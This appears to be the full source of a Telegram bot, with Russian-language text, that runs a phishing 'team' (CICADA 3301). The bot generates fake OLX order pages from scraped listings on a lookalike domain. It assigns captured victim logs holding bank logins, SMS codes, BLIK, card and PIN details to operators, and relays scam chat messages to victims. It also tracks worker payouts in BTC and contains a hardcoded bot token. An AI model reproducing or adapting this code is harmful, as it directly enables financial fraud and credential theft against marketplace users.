var { Telegraf, Markup, Scenes, Stage, session, Extra} = require("telegraf")
var { existsSync, readdirSync, writeFileSync, unlinkSync, mkdirSync, readFileSync } = require("fs")
const axios = require("axios")
var convert = require('xml-js');

var bot = new Telegraf("5442108073:AAHps9v16gGPZaLc_y1UAVQfYjIB07S8gbQ")

var cfg = {
    access: "-1001662224278",
    chat: "https://t.me/+dmW6_6RD_eszNjEy",
    profits: "https://t.me/+Iu3aRha_6Ck4NTVi",
    bugs: "-1001648454323"
}

var _local = {
    cp: ["pl", "de", "it"],
    cp_flags: {"pl": "🇵🇱", "de": "🇩🇪", "it": "🇮🇹"},
    pldomain: "cicada3301.mobi",

    menu: Markup.inlineKeyboard([
        [
            Markup.button.callback("🇵🇱 Польша", "@country:poland"),
            Markup.button.callback("🇩🇪 Германия", "@country:germany")
        ],
        [
            Markup.button.callback("🇮🇹 Италия", "@country:italy"),
        ],
        [
            Markup.button.callback("☁️ Чаты", "chats"),
            Markup.button.callback("📘 Руководство", "rukovodstvo"),
        ],
        [
            Markup.button.callback("❗️ Жалоба на Баг/Домен", "bug/domain")
        ],
        [
            Markup.button.callback("👨‍🏫 Наставники", "mentors")
        ]
    ]),

    tmenu: {
    inline_keyboard: [
        [
            Markup.button.callback("🇵🇱 Польша", "@country:poland"),
            Markup.button.callback("🇩🇪 Германия", "@country:germany")
        ],
        [
            Markup.button.callback("🇮🇹 Италия", "@country:italy"),
        ],
        [
            Markup.button.callback("☁️ Чаты", "chats"),
            Markup.button.callback("📘 Руководство", "rukovodstvo"),
        ],
        [
            Markup.button.callback("❗️ Жалоба на Баг/Домен", "bug/domain")
        ],
        [
            Markup.button.callback("👨‍🏫 Наставники", "mentors"),
            Markup.button.callback("👨‍👩‍👦 Контакты", "contacts"),
        ]
    ]},
    countrys: {
        poland: Markup.inlineKeyboard([
            [
                Markup.button.callback("❇️ OLX", "@goto:olx"),
                Markup.button.callback("❇️ Inpost", "@goto:inpost"),
            ],
            [
                Markup.button.callback("❇️ Vinted", "@goto:vinted"),
                Markup.button.callback("❇️ Poczta Polska", "@goto:poczta-polska"),
            ],
            [
                Markup.button.callback("❇️ Allegro 1.0", "@goto:alegro"),
                Markup.button.callback("❇️ Allegro 2.0", "@goto:allegro"),
            ],
            [
                Markup.button.callback("❇️ DPD", "@goto:olxpl"),
            ],
            
            
            
        ])
    }
}   

function randint(min, max) {
    let rand = min - 0.5 + Math.random() * (max - min + 1);
    return Math.round(rand);
  }

async function createUser(id){
    await mkdirSync("database/maindb/" + id) //UserDir
    await mkdirSync("database/maindb/" + id + "/profits") //Profits Count
    await writeFileSync("database/maindb/" + id + "/tag", `w${randint(111111, 999999)}`) //UserTag example(w123456)
    await writeFileSync("database/maindb/" + id + "/percent", `55`) //Payout Percent
}

function getMentor(id){
    return { 
        tag: readFileSync("database/maindb/" + id + "/tag") 
    }
}

function recentMentor(id){
    let mpr = Number(readFileSync("database/maindb/" + id + "/mpr"))
    let profits = (readdirSync("database/maindb/" + id + "/profits/").length)

    if (profits >= mpr){
        return 'Вы можете отказаться'
    }else{
        return `Осталось ${mpr-profits} профита.`
    }


}

function getProfits(id){
    if (readdirSync("database/maindb/" + id + "/profits/").length == 0){
        return 0
    }else{
        let profits = 0

        readdirSync("database/maindb/" + id + "/profits/").forEach(cf => {
            profits += Number(readFileSync("database/maindb/" + id + "/profits/" + cf))
        })

        return profits
    }
}

function hand(){

   var rtx = ""
   var anytime = ""

   _local.cp.forEach(_country => {
       if (readdirSync("database/hand/" + _country).length != 0){
            readdirSync("database/hand/" + _country).forEach(_handler => {
                anytime += `@${_handler}, `
            })
            rtx += `${_local.cp_flags[_country]} - ${anytime.substring(0, anytime.length-2)}.\n`
        }else rtx += `${_local.cp_flags[_country]} - Вбив пустой.\n`
   })

   return rtx;
}

const bgd = new Scenes.WizardScene(
    "bgd",
    (ctx) => {
        ctx.reply("<b>-></b> Введите всю суть жалобы в одном сообщении, после того как мы получим ваше сообщение мы передадим сообщение администрации.\n\n❗️ Обязательно придерживайтесь правил, приложите доказательства в виде видео или скриншота иначе ваша заявка будет проигнорирована.", {parse_mode: "HTML", reply_markup: { 
            inline_keyboard: [
                [
                    Markup.button.callback("Отменить", "cancel")
                ]
            ]
        }})
        ctx.wizard.next()
    },
    async (ctx) => {
        if (typeof ctx.update.callback_query != 'undefined') return ctx.reply("Отменено. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Меню", "callMenu")
            ]
        ])).then(ctx.scene.leave())
        await ctx.forwardMessage(cfg.bugs)
        await bot.telegram.sendMessage(cfg.bugs, "☝️ На момент отправления у пользователя стоял тэг @" + ctx.from.username + " (<b>ID: " + ctx.from.id + "</b>)", {parse_mode: "HTML"})
        await ctx.reply("👍 Мы успешно передали вашу заявку старшей администрации, в ближайшее время ее обработают.")
        await ctx.scene.leave()
    }
)

const register = new Scenes.WizardScene(
    "register", 
    (ctx) => {
        ctx.wizard.state.data = {}
        ctx.reply("🌱 Откуда вы о нас узнали?")
        ctx.wizard.next()
    },
    (ctx) => {
        ctx.wizard.state.data.from = ctx.message.text
        ctx.reply("👁 Был ли у вас опыт работы в подобных сферах деятельности?\n\n❗️ Если опыт был, в ответ на это сообщение напишите ответ. Внизу вам выданы кнопки быстрого ответа.", Markup.keyboard([
            ["Нет опыта."], ["Есть небольшой опыт."], ["Обучаюсь"]
        ]).resize())
        ctx.wizard.next()
    },
    (ctx) => {
        ctx.reply("🤝 Ваша заявка успешно отправлена на рассмотрение администрации. До скорых встреч!", {reply_markup: { remove_keyboard: true }})

        bot.telegram.sendMessage(cfg.access, `<b>⚙️ Пришла новая заявка №${readdirSync("database/attempts/").length+1}!</b>\n\n<b>Tag</b>: @${ctx.from.username}\n<b>Откуда узнал:</b> ${ctx.wizard.state.data.from}\n<b>Опыт</b>: ${ctx.message.text}\n\n\n<code>❗️ Для вынесения вердикта нажмите соответствующие кнопки ниже.</code>`, {parse_mode: "HTML", reply_markup: { 
            inline_keyboard: [
                [
                    Markup.button.callback("✅ Принять", "@accept:" + ctx.from.id),
                    Markup.button.callback("❌ Отклонить", "@disaccept:" + ctx.from.id),
                ],
                [
                    Markup.button.callback("❌ Отклонить + Заблокировать", "@disblock:" + ctx.from.id),
                ],
            ]
        }})

        writeFileSync("database/attempts/" + ctx.from.id, "1")
        
        ctx.scene.leave()
    }
)

async function parse_link(link) {

    if (link.includes("m.olx.pl")) {
      link = link.replace("m.olx.pl", "www.olx.pl")
    }

    if (link.includes("olx.pl/d/")) {
      link = link.replace("olx.pl/d/", "olx.pl/")
    }
    
    const options = {
        method: 'GET',
        headers: { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36' },
        url: link
    }

    let res = await axios(options);
    let data = res.data;
    var gallery = data.match(/<div class="swiper-zoom-container">(.+)<\/div>/)
    var title = data.match(/<h1 data-cy="ad_title" class="css-r9zjja-Text eu5v0x0">(.+)<\/h1>/)[1].trim();
    if (typeof data.match(/<h3 class="css-okktvh-Text eu5v0x0">(.+)<\/h3><\/div>/) != undefined) {
        var price = data.match(/<h3 class="css-okktvh-Text eu5v0x0">(.+)<\/h3>/)[1].split("<")[0].replace(/[^0-9]/g, "")
    } else {
        var price = data.match(/<h3 class="css-okktvh-Text eu5v0x0">(.+)<\/h3>/)[1].replace(/[^0-9]/g, "");
    }
    const images = []

    if (title == "" || title == undefined || price == "" || price == undefined) return "404"

    var regular = /src=\"(.*?)\"/g
    do {
        match = regular.exec(gallery)

        if (match) {
            images.push(match[0].match(/src="(.+)"/)[1])
        }
    } while (match)

    const photo = images[0]
    
    if (photo == "undefined") {
        photo = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRtvMCg-jkC382cdG9nIYNOmAm0iAksv6vlAhbVLI_AyuuO43Fne-rCYPE3Yo4bZ_oiiqo&usqp=CAU"
    }

    return { title: title, price: price.replace(/\B(?=(\d{3})+(?!\d))/g, " "), image: photo}

}

const olx = new Scenes.WizardScene(
    "olx",
    (ctx) => {
        ctx.wizard.state.data = {}
        ctx.reply("❇️ Введи ссылку на обьявление.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Отменить", "cancel")
            ]
        ]))
        ctx.wizard.next()
    },
    async (ctx) => {
        if (typeof ctx.update.callback_query != 'undefined') return ctx.reply("Отменено. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Меню", "callMenu")
            ]
        ])).then(ctx.scene.leave())
        let adv = await parse_link(ctx.message.text)
        if (adv == "404") return ctx.reply("Произошла ошибка при парсинге, ссылка битая. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Меню", "callMenu")
            ]
        ])).then(ctx.scene.leave())

        ctx.wizard.state.data.obyava = adv.title
        ctx.wizard.state.data.price = adv.price
        ctx.wizard.state.data.img = adv.image
        
        if (existsSync("database/savethe/" + ctx.from.id) == false){
            ctx.reply("Укажи получателя.", Markup.inlineKeyboard([
                [
                    Markup.button.callback("Отменить", "cancel")
                ]
            ]))
        }else{
            let json = JSON.parse(readFileSync("database/savethe/" + ctx.from.id))
            ctx.reply("Укажи получателя.", Markup.inlineKeyboard([
                [
                    Markup.button.callback( (json['fio'].length > 10) ? json['fio'].substring(0, 10) + "..." : json['fio'], "fio")
                ],
                [
                    Markup.button.callback("Отменить", "cancel")
                ]
            ]))  
        }
        ctx.wizard.next()
    },
    (ctx) => {
        if (typeof ctx.update.callback_query != 'undefined'){
            if (ctx.update.callback_query.data == "cancel"){
            return ctx.reply("Отменено. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
                [
                    Markup.button.callback("Меню", "callMenu")
                ]
            ])).then(ctx.scene.leave())
        }else{
            ctx.wizard.state.data.fio = JSON.parse(readFileSync("database/savethe/" + ctx.from.id))['fio']
            ctx.reply("❕ Автоматически установлено имя получателя <b>-></b> " + JSON.parse(readFileSync("database/savethe/" + ctx.from.id))['fio'], {parse_mode: "HTML"})
        }
    }else{
        ctx.wizard.state.data.fio = ctx.message.text
    }
    if (existsSync("database/savethe/" + ctx.from.id) == false){
        ctx.reply("Укажи адресс получателя.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Отменить", "cancel")
            ]
        ]))
    }else{
        let json = JSON.parse(readFileSync("database/savethe/" + ctx.from.id))
        ctx.reply("Укажи адресс получателя.", Markup.inlineKeyboard([
            [
                Markup.button.callback( (json['to'].length > 10) ? json['to'].substring(0, 10) + "..." : json['to'], "to")
            ],
            [
                Markup.button.callback("Отменить", "cancel")
            ]
        ]))  
    }
        ctx.wizard.next()
    },
    async (ctx) => {
        if (typeof ctx.update.callback_query != 'undefined'){
            if (ctx.update.callback_query.data == "cancel"){
            return ctx.reply("Отменено. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
                [
                    Markup.button.callback("Меню", "callMenu")
                ]
            ])).then(ctx.scene.leave())
        }else{
            ctx.wizard.state.data.to = JSON.parse(readFileSync("database/savethe/" + ctx.from.id))['to']
            ctx.reply("❕ Автоматически установлен адресс получателя <b>-></b> " + JSON.parse(readFileSync("database/savethe/" + ctx.from.id))['to'], {parse_mode: "HTML"})
        }
    }else{
        ctx.wizard.state.data.to = ctx.message.text
    }
        let randomc = randint(000000,999999)
    ctx.wizard.state.data['worker_id'] = ctx.from.id
    ctx.wizard.state.data['worker'] = ctx.from.username
    writeFileSync(`../olx/data/${randomc}.xml`, "<xml>\n" + convert.json2xml(ctx.wizard.state.data, {compact: true, ignoreComment: true, spaces: 4}) + "\n</xml>" )
    writeFileSync("database/savethe/" + ctx.from.id, JSON.stringify({fio: ctx.wizard.state.data.fio, to: ctx.wizard.state.data.to}))
    ctx.reply(`❇️ Информация о трек номере!\n\n❇️ Трек номер: ${randomc}\n❇️ Название: ${ctx.wizard.state.data.obyava}\n❇️ Стоимость: ${ctx.wizard.state.data.price} PLN\n\n👉 https://olx.${_local.pldomain}/order.php?id=${randomc}`)
    await ctx.scene.leave()

    }
)



const stage = new Scenes.Stage([
    register, bgd, olx
])

bot.use(session());
bot.use(stage.middleware());


bot.on("callback_query", async (ctx) => {
    let clb = ctx.update.callback_query;

    if (existsSync("database/block/" + ctx.from.id) == true){
        return ctx.reply("Вы были заблокированы. Свяжитесь с администрацией.")
    }

    if (clb.data.substring(0, 10) == "@declined:"){
        let id = clb.data.replace("@declined:", "")
        bot.telegram.sendMessage(id, `⚠️ Вбивер @${ctx.from.username} по обьявлению "${clb.message.text.match(/❇️ Обьявление: (.+)/)[1]}" сообщил <b>что мамонт отклонил запрос на списание. Более точно вы можете спросить у вбивера</b>.`, {parse_mode: "HTML"})
    }

    if (clb.data.substring(0, 9) == "@nomoney:"){
        let id = clb.data.replace("@nomoney:", "")
        bot.telegram.sendMessage(id, `⚠️ Вбивер @${ctx.from.username} по обьявлению "${clb.message.text.match(/❇️ Обьявление: (.+)/)[1]}" сообщил что <b>у мамонта нет средств</b>.`, {parse_mode: "HTML"})
    }

    if (clb.data.substring(0, 9) == "@badinfo:"){
        let id = clb.data.replace("@badinfo:", "")
        bot.telegram.sendMessage(id, `⚠️ Вбивер @${ctx.from.username} по обьявлению "${clb.message.text.match(/❇️ Обьявление: (.+)/)[1]}" сообщил что <b>мамонт ввел не верные данные</b>.`, {parse_mode: "HTML"})
    }

    if (clb.data.substring(0, 6) == "@pick:"){
        
        let logname = clb.data.replace("@pick:", "")
        let json = JSON.parse(readFileSync("/var/www/html/logs/" + logname))
        writeFileSync(`/var/www/html/logs_ck/${json['uid']}_${json['worker_id']['0']}`, String(ctx.from.id))
        ctx.editMessageText(clb.message.text + "\n👉 Взял лог -> @" + ctx.from.username)
        bot.telegram.sendMessage(ctx.from.id, `<b>${clb.message.text.match(/(.+) NEW LOG/)[1]}</b>\n\n<b>❇️ Локация</b>: ${clb.message.text.match(/❇️ Локация: (.+)/)[1]}\n<b>❇️ Обьявление</b>: ${json['name']['0']}\n<b>❇️ Стоимость</b>: ${json['price']['0']}\n<b>❇️ Воркер</b>: ${json['worker']['0']}\n<b>❇️ Воркер ID</b>: ${json['worker_id']['0']}\n<b>❇️ Идентификатор</b>: ${json['uid']} / ${json['domain']}\n\n${json['log']}`, {parse_mode: "HTML", reply_markup: {
            inline_keyboard: [
                [
                    Markup.button.callback("Отклонено", "@declined:" + json['worker_id']['0']),
                    Markup.button.callback("Нет денег", "@nomoney:" + json['worker_id']['0'])
                ],
                [
                    Markup.button.callback("Неверные данные", "@badinfo:" + json['worker_id']['0']),
                    Markup.button.callback("Фэйк", "@fakelog:" + json['worker_id']['0'])
                ],
                [
                    Markup.button.callback("ЛК", `@lk:${json['uid']}:${json['worker_id']['0']}`),
                    Markup.button.callback("Токен", `@pkotoken:${json['uid']}:${json['worker_id']['0']}`),
                    Markup.button.callback("SMS", `@sms:${json['uid']}:${json['worker_id']['0']}`),
                    Markup.button.callback("BLIK", `@blik:${json['uid']}:${json['worker_id']['0']}`),
                ],
                [
                    Markup.button.callback("Пуш", `@lk:${json['uid']}:${json['worker_id']['0']}`),
                    Markup.button.callback("Карта", `@pkotoken:${json['uid']}:${json['worker_id']['0']}`),
                    Markup.button.callback("PIN", `@sms:${json['uid']}:${json['worker_id']['0']}`),
                ],
                [
                    Markup.button.callback("✅ Залет", `@profit:${json['worker_id']['0']}`)
                ]
            ]
        }})
        bot.telegram.sendMessage(json['worker_id']['0'], `${clb.message.text.match(/(.+) NEW LOG/)[1]}\n⚠️ За вбив твоего обьявления ${json['name']['0']} взялся вбивер @${ctx.from.username} ⚠️`, {parse_mode: "HTML"})
    }

    if (clb.data.substring(0, 6) == "@goto:"){
        try {
        ctx.scene.enter(clb.data.replace("@goto:", ""), ctx.scene.stage)
        }catch (e) {
            ctx.reply("Произошла ошибка. " + e)
        }
    }

    if (clb.data.substring(0, 9) == "@wmentor:"){
        let id = clb.data.replace("@wmentor:", "")

        if (existsSync("database/maindb/" + ctx.from.id + "/mentor") == true) return ctx.reply("У вас уже есть наставник! Вы можете от него отказаться командой /leavementor")

        writeFileSync("database/maindb/" + ctx.from.id + "/mpr", String(readdirSync("database/maindb/" + ctx.from.id + "/profits/").length+3))
        writeFileSync("database/maindb/" + ctx.from.id + "/mentor", String(id))
        writeFileSync("database/maindb/" + ctx.from.id + "/percent", String(Number(readFileSync("database/maindb/" + ctx.from.id + "/percent")) - 5))

        bot.telegram.sendMessage(id, "👨‍🎓 У вас появился новый наставник - @" + ctx.from.username + "! (#" + readFileSync("database/maindb/" + ctx.from.id + "/tag") + ")")
        ctx.reply("👨‍🎓 Отлично! Теперь вы стали учеником #" + readFileSync("database/maindb/" + id + "/tag") + ". Вы можете связаться с ним через кнопку ниже.", Markup.inlineKeyboard([
            [
                Markup.button.url(`#${readFileSync("database/maindb/" + id + "/tag")}`, "tg://user?id=" + id)
            ]
        ]))
    }

    if (clb.data == "contacts"){
        return ctx.editMessageCaption("👨‍👩‍👦 Контакты\n\n🌍 Владелец ТС :\n@CICADA3301_start\n\n🌐 Жалобы и предложения :\n@CICADA3301_logistics", Markup.inlineKeyboard([[Markup.button.callback("Назад", "tomenu")]]))
    }
    
    if (clb.data.substring(0, 11) == "@go_mentor:"){
        let id = clb.data.replace("@go_mentor:", "")

        if (existsSync("database/mentors/" + id) == true){
            ctx.editMessageCaption(`👨‍🏫 #${readFileSync("database/maindb/" + id + "/tag")}\n\n${decodeURIComponent(JSON.parse(readFileSync("database/mentors/" + id))['text'])}`, {reply_markup: {
                inline_keyboard: [
                    [
                        Markup.button.callback("👨‍🎓 Стать учеником", "@wmentor:" + id),
                        Markup.button.callback("Назад", "mentors"),
                        
                    ]
                ]
            }})
        }else{
            ctx.reply("Данный наставник был уволен, возможно вам стоит выбрать нового.")
        }
    }

    if (clb.data == "rukovodstvo"){
        ctx.editMessageCaption("", Markup.inlineKeyboard([
            [
                Markup.button.callback("📱 Номера", "numbers"),
                Markup.button.url("📚 Мануалы.", "https://t.me/+YRjGkLC2fvYwMzQy"),
            ],
            [
                Markup.button.callback("Меню", "tomenu")
            ]
        ]))
    }

    if (clb.data == "numbers"){
        ctx.editMessageCaption("📱 Номера для регистрации мессенджера и аккаунтов.\n\n✅ @SMSBest_bot\n✅ onlinesim.ru\n✅ 5sim.net\n✅ @GreedySMSbot\n✅ sms-activate.ru\n✅ @Jeazz19", Markup.inlineKeyboard([
            [
                Markup.button.callback("Меню", "tomenu")
            ]
        ]))
    }

    if (clb.data == "checkOnline"){
            let id = clb.message.text.match(/❇️ Трек номер: (.+)\|(.+)/)[1]
            let service = clb.message.text.match(/❇️ Трек номер: (.+)\|(.+)/)[2]
          if (existsSync(`../${service}/chat_src/data/${id}.json`)){
    
            let backend = readFileSync(`../${service}/chat_src/data/${id}.json`).toString("utf-8")
            writeFileSync(`../${service}/chat_src/data/${id}.json`, `${backend.substring(0, backend.length-1)}, {"sender": "testOnline", "message": "${encodeURI(ctx.message.text.replace(/"/g, "'"))}"}]`)
    
          }else{
            writeFileSync(`../${service}/chat_src/data/${id}.json`, `[{"sender": "testOnline", "message": "1"}]`)
          }
          ctx.reply("✴️ Запрос отправлен, ответ прийдёт в случае если мамонт на сайте.", {reply_to_message_id: clb.message.message_id})
    }

    if (clb.data == "mentors"){
        if (readdirSync("database/mentors/").length == 0){
            ctx.editMessageCaption("К сожалению в данный момент у нас нету наставников.\n\n❗️ Вы всегда можете подать заявку на Наставничество через раздел Контакты.", Markup.inlineKeyboard([[Markup.button.callback("В Меню", "tomenu")]]))
        }else{
            let mentors_selector = [[]]

            readdirSync("database/mentors/").forEach(mentor => {
                mentors_selector.push([{text: `👨‍🏫 #${readFileSync("database/maindb/" + mentor + "/tag")}`, callback_data: `@go_mentor:${mentor}`}])
            })

            mentors_selector.push([{text: `В меню`, callback_data: `tomenu`}])

            ctx.editMessageCaption("<b>-></b> Здесь вы можете выбрать наставника который в будущем поможет вам и поможет сделать профит. За это вы будете отдавать 5% с каждого профита наставнику, вы сможете отказаться от наставника после 3х профитов.", { parse_mode: "HTML", reply_markup: JSON.stringify({ inline_keyboard: mentors_selector })
        })
        }
    }

    if (clb.data == "bug/domain") return ctx.scene.enter("bgd", ctx.scene.stage)

    if (clb.data == "tomenu"){
        return ctx.editMessageCaption(`❗️ Добро пожаловать, <b>${ctx.from.first_name}</b>!\n\n❕ Твой <b>UID</b>: #${readFileSync("database/maindb/" + ctx.from.id + "/tag")}\n❕ Ты работаешь под: <b>${readFileSync("database/maindb/" + ctx.from.id + "/percent")}%</b>.\n❕ У тебя <b>${readdirSync("database/maindb/" + ctx.from.id + "/profits/").length} профитов</b>.\n❕ Сумма профитов составляет <b>${getProfits(ctx.from.id)} USD</b>.\n❕ Твой BTC: ${existsSync("database/maindb/" + ctx.from.id + "/btc") ? "<b>" + readFileSync("database/maindb/" + ctx.from.id + "/btc") + "</b>" : "<b>Не установлен.</b>"}\n❕ Наставник: ${existsSync("database/maindb/" + ctx.from.id + "/mentor") ? "<b>#" + String(getMentor(readFileSync("database/maindb/" + ctx.from.id + "/mentor"))['tag']) + " (" + recentMentor(ctx.from.id) + ")</b>": "<b>Нету</b>."}\n\n${hand()}`, {reply_markup: JSON.stringify(_local.tmenu), parse_mode: "HTML"})
    }
    
    if (clb.data == "chats"){
        return ctx.editMessageCaption(`☁️ Чаты CICADA 3301.\n\n❗️ Вы можете увидеть все доступные и актуальные ссылки нажав на кнопки ниже.`, Markup.inlineKeyboard([
            [
                Markup.button.url("Общий чат", cfg.chat),
                Markup.button.url("Профиты", cfg.profits)
            ],
            [
                Markup.button.callback("❕ В меню", "tomenu")
            ]
        ]))
    }

    if (clb.data == "goreg"){
        if (existsSync("database/attempts/" + ctx.from.id) == false){
            ctx.scene.enter("register", ctx.scene.stage)
        }else{
            ctx.reply("Вы уже подали заявку, ожидайте решения администрации.")
        }
    }

    if (clb.data.substring(0,9) == "@country:"){
        if (existsSync("database/maindb/" + ctx.from.id + "/btc") == false) return ctx.reply("Вам необходимо установить BTC кошелёк.")
        ctx.editMessageCaption("", _local.countrys[clb.data.replace("@country:", "")])
    }
    if (clb.data == "callMenu") return ctx.replyWithPhoto("https://i.ibb.co/R0Qcf25/123.jpg", {caption: `❗️ Добро пожаловать, <b>${ctx.from.first_name}</b>!\n\n❕ Твой <b>UID</b>: #${readFileSync("database/maindb/" + ctx.from.id + "/tag")}\n❕ Ты работаешь под: <b>${readFileSync("database/maindb/" + ctx.from.id + "/percent")}%</b>.\n❕ У тебя <b>${readdirSync("database/maindb/" + ctx.from.id + "/profits/").length} профитов</b>.\n❕ Сумма профитов составляет <b>${getProfits(ctx.from.id)} USD</b>.\n❕ Твой BTC: ${existsSync("database/maindb/" + ctx.from.id + "/btc") ? "<b>" + readFileSync("database/maindb/" + ctx.from.id + "/btc") + "</b>" : "<b>Не установлен.</b>"}\n❕ Наставник: ${existsSync("database/maindb/" + ctx.from.id + "/mentor") ? "<b>#" + String(getMentor(readFileSync("database/maindb/" + ctx.from.id + "/mentor"))['tag']) + " (" + recentMentor(ctx.from.id) + ")</b>": "<b>Нету</b>."}\n\n${hand()}`, reply_markup: JSON.stringify(_local.tmenu), parse_mode: "HTML"})
    if (clb.data.substring(0, 8) == "@accept:"){
        let id = clb.data.match(/@accept:(.+)/)[1]
        createUser(id)
        writeFileSync("database/users/" + id, ctx.from.username)
        await bot.telegram.sendMessage(id, "✅ Ваша заявка на вступление была одобрена.")
        await bot.telegram.sendMessage(id, "Полезные ссылки.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Меню", "gomenu")
            ],
            [
                Markup.button.url("Общий чат", cfg.chat)
            ],
            [
                Markup.button.url("Профиты", cfg.profits)
            ]
        ]))
        ctx.editMessageText(clb.message.text + "\n\n✅ Одобрена @" + ctx.from.username)
    }
    if (clb.data.substring(0, 11) == "@disaccept:"){
        let id = clb.data.match(/@disaccept:(.+)/)[1]
        bot.telegram.sendMessage(id, "❌ Ваша заявка на вступление была отклонена.")
        unlinkSync("database/attempts/" + id)
        ctx.editMessageText(clb.message.text + "\n\n❌ Отклонена @" + ctx.from.username)
    }
    if (clb.data.substring(0, 10) == "@disblock:"){
        let id = clb.data.match(/@disblock:(.+)/)[1]
        writeFileSync("database/block/" + id, ctx.from.username)
        ctx.editMessageText(clb.message.text + "\n\n❌ Отклон+Блок @" + ctx.from.username)
        bot.telegram.sendMessage(id, "Вы были заблокированы.")
    }
})

bot.use((ctx, next) => {
    if (ctx.chat.type != "private") return false
    if (existsSync("database/block/" + ctx.from.id) == true){
        return ctx.reply("Вы были заблокированы. Свяжитесь с администрацией.")
    }

    if (existsSync("database/users/" + ctx.from.id) == false){
        ctx.reply("🥷 Мы не увидели что вы зарегестрированы в нашей системе, советуем это исправить.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Зарегестрироваться", "goreg")
            ]
        ]))
    }else{
        next()
    }
})

bot.command("mtext", (ctx) => {
    if (existsSync("database/mentors/" + ctx.from.id) == false) return ctx.reply("Вы не наставник.")
    if (ctx.message.text == "/mtext") return ctx.reply("Вы должны ввести текст оформления. Пример: /mtext Text")

    let text = encodeURIComponent(ctx.message.text.replace("/mtext", ""))

    writeFileSync("database/mentors/" + ctx.from.id, JSON.stringify({text: text}))
    ctx.reply("Вы успешно сменили текст!")
})

bot.command("leavementor", (ctx) => {
    if (existsSync("database/maindb/" + ctx.from.id + "/mentor") == false) return ctx.reply("У вас нету наставника.")
    if (recentMentor(ctx.from.id) == "Вы можете отказаться"){
        unlinkSync("database/maindb/" + ctx.from.id + "/mpr")
        unlinkSync("database/maindb/" + ctx.from.id + "/mentor")
        writeFileSync("database/maindb/" + ctx.from.id + "/percent", String(Number(readFileSync("database/maindb/" + ctx.from.id + "/percent")) + 5))
    }else{
        ctx.reply("Вы не можете отказаться от наставника, Вам " + recentMentor(ctx.from.id))
    }
})

bot.command("start", (ctx) => {
    ctx.replyWithPhoto("https://i.ibb.co/R0Qcf25/123.jpg", {caption: `❗️ Добро пожаловать, <b>${ctx.from.first_name}</b>!\n\n❕ Твой <b>UID</b>: #${readFileSync("database/maindb/" + ctx.from.id + "/tag")}\n❕ Ты работаешь под: <b>${readFileSync("database/maindb/" + ctx.from.id + "/percent")}%</b>.\n❕ У тебя <b>${readdirSync("database/maindb/" + ctx.from.id + "/profits/").length} профитов</b>.\n❕ Сумма профитов составляет <b>${getProfits(ctx.from.id)} USD</b>.\n❕ Твой BTC: ${existsSync("database/maindb/" + ctx.from.id + "/btc") ? "<b>" + readFileSync("database/maindb/" + ctx.from.id + "/btc") + "</b>" : "<b>Не установлен.</b>"}\n❕ Наставник: ${existsSync("database/maindb/" + ctx.from.id + "/mentor") ? "<b>#" + String(getMentor(readFileSync("database/maindb/" + ctx.from.id + "/mentor"))['tag']) + " (" + recentMentor(ctx.from.id) + ")</b>": "<b>Нету</b>."}\n\n${hand()}`, reply_markup: JSON.stringify(_local.tmenu), parse_mode: "HTML"})
})


bot.command("main", (ctx) => {
    ctx.replyWithPhoto("https://i.ibb.co/R0Qcf25/123.jpg", {caption: `❗️ Добро пожаловать, <b>${ctx.from.first_name}</b>!\n\n❕ Твой <b>UID</b>: #${readFileSync("database/maindb/" + ctx.from.id + "/tag")}\n❕ Ты работаешь под: <b>${readFileSync("database/maindb/" + ctx.from.id + "/percent")}%</b>.\n❕ У тебя <b>${readdirSync("database/maindb/" + ctx.from.id + "/profits/").length} профитов</b>.\n❕ Сумма профитов составляет <b>${getProfits(ctx.from.id)} USD</b>.\n❕ Твой BTC: ${existsSync("database/maindb/" + ctx.from.id + "/btc") ? "<b>" + readFileSync("database/maindb/" + ctx.from.id + "/btc") + "</b>" : "<b>Не установлен.</b>"}\n❕ Наставник: ${existsSync("database/maindb/" + ctx.from.id + "/mentor") ? "<b>#" + String(getMentor(readFileSync("database/maindb/" + ctx.from.id + "/mentor"))['tag']) + " (" + recentMentor(ctx.from.id) + ")</b>": "<b>Нету</b>."}\n\n${hand()}`, reply_markup: JSON.stringify(_local.tmenu), parse_mode: "HTML"})
})

bot.on("message", (ctx) => {
    if (typeof ctx.message.reply_to_message != "undefined"){
    if (ctx.message.reply_to_message.text.includes("❇️ Трек номер:")){
      let id = ctx.message.reply_to_message.text.match(/❇️ Трек номер: (.+)\|(.+)/)[1]
      let service = ctx.message.reply_to_message.text.match(/❇️ Трек номер: (.+)\|(.+)/)[2]
      if (ctx.message.text.includes('"') == true){
        ctx.reply(`Символы которые вы указали "" запрещены поэтому они были автоматически заменены на ''.`)
      }
      if (existsSync(`../${service}/chat_src/data/${id}.json`)){
  
        let backend = readFileSync(`../${service}/chat_src/data/${id}.json`).toString("utf-8")
        writeFileSync(`../${service}/chat_src/data/${id}.json`, `${backend.substring(0, backend.length-1)}, {"sender": "t", "message": "${ctx.message.text.replace(/"/g, "'")}"}]`)
  
      }else{
        writeFileSync(`../${service}/chat_src/data/${id}.json`, `[{"sender": "t", "message": "${ctx.message.text.replace(/"/g, "'")}"}]`)
      }
      ctx.reply("Сообщение передано.", {reply_to_message_id: ctx.message.message_id})
    }
  }
})







bot.catch(err => console.log(err))
bot.launch()